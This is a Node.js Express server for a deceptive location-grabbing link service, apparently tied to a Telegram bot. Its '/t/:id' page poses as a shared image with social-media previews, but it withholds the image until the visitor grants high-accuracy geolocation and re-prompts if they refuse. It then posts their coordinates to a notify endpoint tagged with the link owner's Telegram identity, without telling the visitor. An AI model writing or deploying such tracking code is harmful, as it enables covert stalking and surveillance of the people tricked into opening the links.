const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
const BOT_NOTIFY_URL = process.env.BOT_NOTIFY_URL;
const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
const VPS_IP = process.env.VPS_IP;
const BOT_API_URL =
    process.env.BOT_API_URL ||
    (VPS_IP ? `http://${VPS_IP}:5000` : 'http://localhost:5000');

if (!BOT_NOTIFY_URL || !NOTIFY_API_KEY) {
    console.warn('Missing BOT_NOTIFY_URL or NOTIFY_API_KEY. Location alerts will fail until they are configured.');
}

function escapeHtml(value) {
    return String(value || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

async function getLinkData(linkId) {
    const response = await axios.get(`${BOT_API_URL}/links/${linkId}`, {
        timeout: 10000
    });

    return response.data;
}

app.get('/media/:id', async (req, res) => {
    try {
        const linkData = await getLinkData(req.params.id);

        if (!linkData || !linkData.thumbnail) {
            return res.status(404).send('Image not found');
        }

        const imageResponse = await axios.get(linkData.thumbnail, {
            responseType: 'stream',
            timeout: 15000
        });

        res.setHeader(
            'Content-Type',
            imageResponse.headers['content-type'] || 'image/jpeg'
        );
        res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');

        imageResponse.data.pipe(res);
    } catch (err) {
        console.error(err.message);
        res.status(404).send('Image not found');
    }
});

app.get('/t/:id', async (req, res) => {
    try {
        const linkId = req.params.id;
        const linkData = await getLinkData(linkId);

        if (!linkData || !linkData.thumbnail) {
            return res.status(404).send('Link not found');
        }

        const imageUrl = `${BASE_URL}/media/${encodeURIComponent(linkId)}`;
        const pageUrl = `${BASE_URL}/t/${encodeURIComponent(linkId)}`;

        res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>View Image</title>

    <meta property="og:title" content="Shared Image">
    <meta property="og:description" content="Open to view the shared image">
    <meta property="og:image" content="${escapeHtml(imageUrl)}">
    <meta property="og:url" content="${escapeHtml(pageUrl)}">
    <meta property="og:type" content="website">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: Arial, Helvetica, sans-serif;
            background: #ffffff;
        }

        main {
            min-height: 100vh;
        }

        button {
            display: none;
            width: 100%;
            max-width: 280px;
            border: 0;
            border-radius: 6px;
            background: #146c94;
            color: #ffffff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 700;
            padding: 14px 18px;
        }

        #statusView {
            display: none;
            min-height: 100vh;
            width: 100%;
            padding: 24px;
            align-items: center;
            justify-content: center;
        }

        .statusCard {
            width: min(100%, 320px);
            margin: 0 auto;
            background: #ffffff;
            border: 1px solid #d9e2ec;
            border-radius: 8px;
            padding: 24px;
            box-shadow: 0 12px 32px rgba(15, 23, 42, 0.08);
            text-align: center;
        }

        .status {
            margin: 0 0 16px;
            color: #52606d;
            line-height: 1.5;
        }

        img {
            display: none;
            width: 100%;
            min-height: 100vh;
            max-height: 100vh;
            object-fit: contain;
            background: #ffffff;
        }
    </style>
</head>
<body>
    <main>
        <section id="statusView">
            <div class="statusCard">
                <p id="status" class="status" role="status"></p>
                <button id="retryButton" type="button">Allow location</button>
            </div>
        </section>

        <img id="sharedImage" src="${escapeHtml(imageUrl)}" alt="Shared image">
    </main>

    <script>
        const linkId = ${JSON.stringify(linkId)};
        const statusEl = document.getElementById('status');
        const statusViewEl = document.getElementById('statusView');
        const imageEl = document.getElementById('sharedImage');
        const retryButtonEl = document.getElementById('retryButton');

        function showImage() {
            statusViewEl.style.display = 'none';
            imageEl.style.display = 'block';
        }

        function showFallback(message) {
            setStatus(message);
            statusViewEl.style.display = 'flex';
        }

        function setStatus(message) {
            statusEl.textContent = message;
        }

        function requestLocation() {
            retryButtonEl.style.display = 'none';
            statusViewEl.style.display = 'none';

            if (!navigator.geolocation) {
                showFallback('This browser could not continue loading the image.');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    try {
                        showImage();

                        fetch('/save-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                linkId,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            })
                        }).catch(() => {
                            // Keep the image visible even if the background notify request fails.
                        });
                    } catch (error) {
                        showFallback('The image could not be opened. Please try again.');
                        retryButtonEl.style.display = 'block';
                    }
                },
                () => {
                    showFallback('Tap below to continue.');
                    retryButtonEl.style.display = 'block';
                },
                {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                }
            );
        }

        retryButtonEl.addEventListener('click', requestLocation);
        requestLocation();
    </script>
</body>
</html>`);
    } catch (err) {
        console.error(err.message);
        res.status(404).send('Link not found');
    }
});

app.post('/save-location', async (req, res) => {
    try {
        const { linkId, latitude, longitude, accuracy } = req.body;

        if (!linkId || latitude === undefined || longitude === undefined) {
            return res.status(400).json({
                error: 'Missing linkId, latitude, or longitude'
            });
        }

        const linkData = await getLinkData(linkId);

        await axios.post(
            BOT_NOTIFY_URL,
            {
                ownerChatId: linkData.ownerChatId,
                ownerName: linkData.ownerName,
                telegramUsername: linkData.telegramUsername,
                latitude,
                longitude,
                accuracy
            },
            {
                headers: {
                    'x-api-key': NOTIFY_API_KEY
                },
                timeout: 10000
            }
        );

        res.json({
            success: true
        });
    } catch (err) {
        console.error(err.message);

        res.status(500).json({
            error: 'Unable to save location'
        });
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
